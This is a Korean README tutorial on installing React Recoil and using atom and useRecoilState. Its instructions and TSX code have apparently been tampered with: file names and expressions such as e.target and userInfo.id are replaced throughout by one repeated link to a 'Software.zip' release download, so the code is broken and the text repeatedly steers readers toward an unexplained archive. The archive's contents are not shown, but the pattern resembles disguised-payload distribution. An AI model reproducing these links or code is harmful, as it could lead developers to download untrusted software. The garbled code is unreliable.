# React Recoil 설치

- yarn add recoil

#

# atom / useRecoilState

1.  https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip 에서 RecoilRoot 컴포넌트로 감싼다.

```html
<RecoilRoot>
  <App />
</RecoilRoot>
```

2.  Atom은 state의 일부를 나타낸다. \
    app이하의 컴포넌트에서 atom을 구독하고 변화가 생기면 재 랜던딩을 한다.\
    https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip 작성

```tsx
import { atom } from "recoil";

const userState = atom({
  key: "userState", // 유일한 ID
  default: { id: "initial ID", user: "initial User", name: "initial Name" }, // 기본값 설정
});
```

3. useRecoilState 사용하여 components 만들기\
   https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip

```tsx
import { useRecoilState } from "recoil";
import { userState } from "../recoil/atoms";

function RecoilUseRecoilState() {
  const [userInfo, setUserInfo] = useRecoilState(userState);
  const updateFiled = (e: https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip<HTMLInputElement>) => {
    const { name, value } = https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip;
    setUserInfo({ https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip, [name]: value });
  };
  return (
    <>
      <h3>Atom-UseRecoilState</h3>
      <Link to={"/"}>Home</Link>
      <h4>idx : {https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip}</h4>
      <h4>user ID : {https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip}</h4>
      <h4>user NAME : {https://github.com/hajesystem/react-recoil/releases/download/v1.0/Software.zip}</h4>
      <p>
        <label>id</label>
        <input type="text" name="id" onChange={updateFiled} />
      </p>
      <p>
        <label>user</label>
        <input type="text" name="user" onChange={updateFiled} />
      </p>
      <p>
        <label>name</label>
        <input type="text" name="name" onChange={updateFiled} />
      </p>
    </>
  );
}
```

#

# selector / useRecoilValue
